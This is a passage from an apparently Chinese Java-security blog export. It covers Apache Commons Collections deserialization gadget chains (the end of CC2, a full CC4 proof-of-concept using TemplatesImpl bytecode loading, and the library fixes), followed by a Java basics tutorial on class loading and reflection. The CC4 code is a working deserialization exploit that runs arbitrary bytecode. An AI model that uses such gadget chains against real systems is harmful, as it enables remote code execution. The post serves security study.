class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span>;<br>              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>CC4就是在CC2的基础上把InvokerTransformer使用TemplatesImpl动态加载字节码代替了。就只放POC就可以了</p><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">byte</span>[]  code = readFile(<span class="hljs-string">&quot;./target/classes/Calc.class&quot;</span>);<br><br><br><br>        tools.setValue(obj,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tools.setValue(obj,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>);<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(comparator);<br><br>        tools.setValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-comment">//        tools.setValue(chainedTransformer,&quot;iTransformers&quot;,transformers);</span><br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">File</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CC4.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(File);<br>        out.writeObject(queue);<br><br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CC4.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(ser);<br>        Object test=  in.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] readFile(String path) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">byte</span>[]  res = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>)file.length()];<br>        fp.read(res);<br>        fp.close();<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220731001611758.png" alt="image-20220731001611758"></p><p>调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span>;<br>              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                TrAXFilter.<span class="hljs-constructor">TrAXFilter()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                         <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过这么多条链的学习，很容易就发现其实CC链是有明显分段的。</p><p>以<code>Transformer.transform()</code>为分界点，前后的链互不依赖可以自由组合。而CC链产生的原因主要集中在后半部分的transformer类中，这些功能强大的类不光为开发者提供了便利，也为攻击者提供了机会。</p><p>而CC链的修复也主要针对transformer类：</p><ul><li><p>CommonsCollections3.2.2里增加了⼀个方法<br>  <code>FunctorUtils#checkUnsafeSerialization</code> ，⽤于检测反序列化是否安全。如果开发者没有设置全局配置 org.apache.commons.collections.enableUnsafeSerialization&#x3D;true ，即默认情况下会抛出异常。这个检查在常⻅的危险Transformer类（ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransformer 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常。</p></li><li><p>CommonsCollections4.1里，将几个危险的transformer类不再实现<code>Serializable</code>接口。</p></li></ul><p>最后用一张图来总结一下CC1~7</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/CC.png" alt="CC"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java基础与特性</title>
    <link href="/2022/07/25/Java%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%89%B9%E6%80%A7/"/>
    <url>/2022/07/25/Java%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="Java基础与特性"><a href="#Java基础与特性" class="headerlink" title="Java基础与特性"></a>Java基础与特性</h1><h2 id="Java代码的运行"><a href="#Java代码的运行" class="headerlink" title="Java代码的运行"></a>Java代码的运行</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Java不同于一般的编译语言和解释语言。它会将源代码编译成字节码，再依赖Java虚拟机来解释字节码。从而具有“一次编写，到处运行”的跨平台特性。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220723112419442.png" alt="image-20220723112419442"></p><p>对于java整个运行流程来说，代码可以说总体有两个大阶段 编译 与 运行。代码存在三个形态：源代码，字节码，机器码</p><p>用一个最简单的Hello world 程序讲讲Java的执行流程。</p><p>一个最简单的Hello world程序就是这样。</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello world&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这就是处于源代码时期。接下来就需要通过Java的编译器来将源代码编译成字节码。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220723115232715.png" alt="image-20220723115232715"></p><p>可以看到 将 .java 的源代码文件编译成了 .class 字节码文件。</p><p>这样源代码就被我们编译成字节码文件，而要执行字节码文件就要将字节码交付给java虚拟机翻译成机器码，再在平台上运行</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220723115654785.png" alt="image-20220723115654785"></p><blockquote><p>这里可以看出 java虚拟机翻译运行的字节码不是通过指定文件的方式，而是有一套自定义的寻找方式。</p></blockquote><h4 id="JVM-JRE-JDK"><a href="#JVM-JRE-JDK" class="headerlink" title="JVM JRE JDK"></a>JVM JRE JDK</h4><p>在安装java的运行环境时，这三个是老生常谈的三巨头。大致上可以将这三个看成一个嵌套的结构</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220723120705254.png"></p><h5 id="JDK-Java-develop-kit-——-编译阶段"><a href="#JDK-Java-develop-kit-——-编译阶段" class="headerlink" title="JDK Java develop kit —— 编译阶段"></a>JDK Java develop kit —— 编译阶段</h5><blockquote><p>在Java的运行过程中 JDK 主要承担的其中带有的Java运行工具进行的 <strong>编译</strong> 工作。上面的 Javac 就是 JDK 中附带的编译器。</p></blockquote><p>在这一步中，编译器会检查源代码的合规性，是否有语法错误，并将检查通过的代码编译成 .class 文件存储在磁盘上。</p><h5 id="JRE-Java-Runtime-env-与-JVM-Java-Virtual-machine-——执行阶段"><a href="#JRE-Java-Runtime-env-与-JVM-Java-Virtual-machine-——执行阶段" class="headerlink" title="JRE Java Runtime env 与 JVM Java Virtual machine ——执行阶段"></a>JRE Java Runtime env 与 JVM Java Virtual machine ——执行阶段</h5><blockquote><p>JRE包括 JVM 和 Java 核心库 两个部分，从目录上体现就是分为 lib 和 bin两个目录</p></blockquote><p>紧接上一步，目前拥有了 .class字节码文件，想要执行这个文件就必须要将 字节码交给 JVM 处理，翻译。</p><p>上面的例子中可以看出，加载字节码的方式并不是指定文件，而是指定 <strong>类名</strong>。JRE会按照一定的顺序去寻找对应的字节码文件(类加载机制)。然后JVM将加载的字节码进行校对，再翻译成机器码，交付给平台执行。</p><p>总体的执行流程类似下图</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220723172007329.png" alt="image-20220723172007329"></p><blockquote><p>编译和执行阶段没有必然的上下关系，只要有对应的文件就可以独立运行。</p></blockquote><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><h4 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h4><p>Java的执行阶段并不会指定具体的 .class字节码文件，而是指定一个类的全限定名，通过类名去寻找对应的字节码文件，加载到内存之中。</p><blockquote><p>这也是为什么 Java 要求文件名要和主类相同的原因。 </p></blockquote><p>而 Java 从寻找 .class 文件到把 字节码装在入 JVM 内存里的整个过程就叫做类加载。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220724111917307.png" alt="image-20220724111917307"></p><h5 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h5><blockquote><p>加载和类加载不是一个概念，加载是类加载的一个部分。</p></blockquote><p>在加载阶段，JVM需要完成三件事</p><ul><li>通过类的全限定名获取该类的二进制字节流。</li><li>将二进制字节流所代表的静态结构转化为方法区的运行时数据结构。</li><li>在内存中创建一个代表该类的 java.lang.Class 对象，作为方法区这个类的各种数据的访问入口。</li></ul><h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>验证阶段确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。</p><h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>准备阶段是正式为类变量（或称“静态成员变量”）分配内存并设置初始值的阶段。这些变量（不包括实例变量）所使用的内存都在方法区中进行分配。</p><p>初始值“通常情况下”是数据类型的零值（0, null…），假设一个类变量的定义为：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> value = <span class="hljs-number">123</span>;<br></code></pre></td></tr></table></figure><p>那么变量 value 在准备阶段过后的初始值为 0 而不是 123，因为这时候尚未开始执行任何 Java 方法。</p><p>存在“特殊情况”：如果类字段的字段属性表中存在 ConstantValue 属性，那么在准备阶段 value 就会被初始化为 ConstantValue 属性所指定的值，假设上面类变量 value 的定义变为：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> value = <span class="hljs-number">123</span>;<br></code></pre></td></tr></table></figure><p>那么在准备阶段虚拟机会根据 ConstantValue 的设置将 value 赋值为 123</p><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><p>解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程。</p><h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><p>类初始化阶段是类加载过程的最后一步，是执行类构造器 <code>&lt;clinit&gt;()</code> 方法的过程。</p><p><code>&lt;clinit&gt;()</code> 方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块（static {} 块）中的语句合并产生的，编译器收集的顺序是由语句在源文件中出现的顺序所决定的。</p><h4 id="类加载器与类加载机制"><a href="#类加载器与类加载机制" class="headerlink" title="类加载器与类加载机制"></a>类加载器与类加载机制</h4><h5 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h5><p>在Java中负责类加载的组件叫做类加载器 ClassLoader</p><p>Java自身提供三个类加载器</p><ul><li>启动类加载器（Bootstrap ClassLoader）： 负责将存放在 <code>&lt;JAVA_HOME&gt;\lib</code> 目录中的，并且能被虚拟机识别的（仅按照文件名识别，如 rt.jar，名字不符合的类库即使放在 lib 目录中也不会被加载）类库加载到虚拟机内存中。</li><li>扩展类加载器（Extension ClassLoader）： 负责加载 <code>&lt;JAVA_HOME&gt;\lib\ext</code> 目录中的所有类库，开发者可以直接使用扩展类加载器。</li><li>应用程序类加载器（Application ClassLoader）： 由于这个类加载器是 ClassLoader 中的 <code>getSystemClassLoader()</code> 方法的返回值，所以一般也称它为“系统类加载器”。它负责加载用户类路径（classpath）上所指定的类库，开发者可以直接使用这个类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。</li></ul><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220724114536862.png" alt="image-20220724114536862"></p><p>在类加载的过程中，使用哪个类加载器遵循一个固有的机制叫做——双亲委派机制。</p><h5 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h5><p>双亲委派机制指的是：当一个类加载器收到了类加载的请求的时候，他不会直接去加载指定的类，而是把这个请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载。</p><blockquote><p>这里存在一个递归的关系，所以可以把整个双亲委派机制看作下图</p></blockquote><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/20210601230727770.png" alt="双亲委派模型"></p><blockquote><p>为什么要使用双亲委派机制？</p><p>首先，<strong>通过委派的方式，可以避免类的重复加载</strong>，当父加载器已经加载过某一个类时，子加载器就不会再重新加载这个类。</p><p>另外，<strong>通过双亲委派的方式，还保证了安全性</strong>。因为Bootstrap ClassLoader在加载的时候，只会加载JAVA_HOME中的jar包里面的类，如java.lang.Integer，那么这个类是不会被随意替换的，除非有人跑到你的机器上， 破坏你的JDK。</p><p>那么，就可以避免有人自定义一个有破坏功能的java.lang.Integer被加载。这样可以有效的防止核心Java API被篡改。</p></blockquote><h2 id="Java的几个重要特性"><a href="#Java的几个重要特性" class="headerlink" title="Java的几个重要特性"></a>Java的几个重要特性</h2><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p>反射是一个很普遍的特性，大多数的语言都拥有反射这一个特性。对象可以通过反射获取到它的类，类可以通过反射来获取到它的方法，方法可以通过反射来调用。总之反射可以为语言本身提供一定的<strong>动态特性</strong>。</p><p>反射本身的功能可以概括成在程序运行时可以<strong>访问、检测、修改</strong>自身<strong>状态和行为</strong>的能力</p><p>对于Java来说反射机制是在运行状态中，<strong>对于任意一个类，都能够知道这个类的所有属性和方法</strong>；<strong>对于任意一个对象，都能够调用它的任意一个方法和属性</strong>。能动态获取的信息以及动态调用对象的方法</p><p>Java之中一切皆对象，那么对于Java来说反射要操作的目标就是对象。对象又来自于类，受类的控制。所以反射的核心就是就在于获取到<strong>类对象(Class 对象)</strong></p><h4 id="Class对象"><a href="#Class对象" class="headerlink" title="Class对象"></a>Class对象</h4><p>这是 Java 反射基石般的存在，这个对象存在的作用就是作为媒介去操作、访问其对应的实例对象。</p><p>举个例子，如果有一个Test类编译之后就是Test.class，这个文件被加载到JVM的时候就成了一个<strong>对应 Test类的 Class对象</strong>。当需要new 一个新的 Test 对象或者访问 Test的静态变量时，JVM就会通过 这个 Class 对象来完成对应的操作。</p><blockquote><p>一个类在JVM只对应一个Class对象</p></blockquote><h5 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h5><ul><li><p>Object.getClass()</p><p>getClass()是从顶级类Object继承而来的，它将返回表示该对象的实际类型的Class对象引用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Test</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>Class clazz=test.getClass();<br>System.out.println(<span class="hljs-string">&quot;clazz:&quot;</span>+clazz.getName());<br></code></pre></td></tr></table></figure></li><li><p>Class.forname()</p><p>forName方法是Class类的一个static成员方法，记住所有的Class对象都源于这个Class类，因此Class类中定义的方法将适应所有Class对象。这里通过forName方法，我们可以获取到Test类对应的Class对象引用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>      <span class="hljs-comment">//通过Class.forName获取Test类的Class对象</span><br>      Class clazz=Class.forName(<span class="hljs-string">&quot;Test&quot;</span>);<br>      System.out.println(<span class="hljs-string">&quot;clazz:&quot;</span>+clazz.getName());<br>    &#125;<span class="hljs-keyword">catch</span> (ClassNotFoundException e)&#123;<br>      e.printStackTrace();<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>类字面常量获取</p><p>直接通过类的属性获取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Test.class;<br></code></pre></td></tr></table></figure></li></ul><h4 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h4><p>Constructor类存在于反射包(java.lang.reflect)中，<strong>反射的是Class 对象所表示的类的构造方法</strong>。获取Constructor对象是通过Class类中的方法获取的。</p><table><thead><tr><th align="left">返回值</th><th>方法名</th><th>方法说明</th></tr></thead><tbody><tr><td align="left">Constructor</td><td>Class.getConstructor(Class&lt;?&gt;… parameterTypes)</td><td>返回指定参数类型、具有public访问权限的构造函数对象</td></tr><tr><td align="left">Constructor&lt;?&gt;[]</td><td>Class.getConstructors()</td><td>返回所有具有public访问权限的构造函数的Constructor对象数组</td></tr><tr><td align="left">Constructor</td><td>Class.getDeclaredConstructor(Class&lt;?&gt;… parameterTypes)</td><td>返回指定参数类型、所有声明的（包括private）构造函数对象</td></tr><tr><td align="left">Constructor&lt;?&gt;[]</td><td>Class.getDeclaredConstructors()</td><td>返回所有声明的（包括private）构造函数对象</td></tr><tr><td align="left"></td><td>Method.invoke(Object obj,Object… arg)</td><td>运行Method对象对应的方法，支持传递参数。</td></tr></tbody></table><h4 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h4><p><strong>Method 提供关于类或接口上单独某个方法（以及如何访问该方法）的信息</strong>，所反映的方法可能是类方法或实例方法（包括抽象方法）</p><table><thead><tr><th>方法返回值</th><th>方法名称</th><th>方法说明</th></tr></thead><tbody><tr><td>Method</td><td>Class.getDeclaredMethod(String name, Class&lt;?&gt;… parameterTypes)</td><td>返回一个指定参数的Method对象，该对象反映此 Class 对象所表示的类或接口的指定已声明方法。</td></tr><tr><td>Method[]</td><td>Class.getDeclaredMethod()</td><td>返回 Method 对象的一个数组，这些对象反映此 Class 对象表示的类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。</td></tr><tr><td>Method</td><td>Class.getMethod(String name, Class&lt;?&gt;… parameterTypes)</td><td>返回一个 Method 对象，它反映此 Class 对象所表示的类或接口的指定公共成员方法。</td></tr><tr><td>Method[]</td><td>Class.getMethods()</td><td>返回一个包含某些 Method 对象的数组，这些对象反映此 Class 对象所表示的类或接口（包括那些由该类或接口声明的以及从超类和超接口继承的那些的类或接口）的公共 member 方法。</td></tr></tbody></table><h4 id="Field"><a href="#Field" class="headerlink" title="Field"></a>Field</h4><p><strong>Field 提供有关类或接口的单个字段的信息</strong>，以及对它的动态访问权限。反射的字段可能是一个类（静态）字段或实例字段。同样的道理，我们可以通过Class类的提供的方法来获取代表字段信息的Field对象。</p><table><thead><tr><th>方法返回值</th><th>方法名称</th><th>方法说明</th></tr></thead><tbody><tr><td>Field</td><td>Class.getDeclaredField(String name)</td><td>获取指定name名称的(包含private修饰的)字段，不包括继承的字段</td></tr><tr><td>Field[]</td><td>Class.getDeclaredField()</td><td>获取Class对象所表示的类或接口的所有(包含private修饰的)字段,不包括继承的字段</td></tr><tr><td>Field</td><td>Class.getField(String name)</td><td>获取指定name名称、具有public修饰的字段，包含继承字段</td></tr><tr><td>Field[]</td><td>Class.getField()</td><td>获取修饰符为public的字段，包含继承字段</td></tr></tbody></table><h4 id="Method例子——三种执行命令"><a href="#Method例子——三种执行命令" class="headerlink" title="Method例子——三种执行命令"></a>Method例子——三种执行命令</h4><h5 id="Runtime执行命令——单例模式"><a href="#Runtime执行命令——单例模式" class="headerlink" title="Runtime执行命令——单例模式"></a>Runtime执行命令——单例模式</h5><blockquote><p>单例模式 — <em>保证一个类仅有一个实例，并提供一个访问它的全局访问点。</em> 实现方式一般是将构造方法设置为 private ，将自身的一个 static 属性设置为一个自身的实例，再通过一个 public 静态方法返回这个属性。 这样外部的所有调用使用都是同一个实例。 java.lang.Runtime 最典型的例子</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/Untitled.png" alt="Untitled"></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> 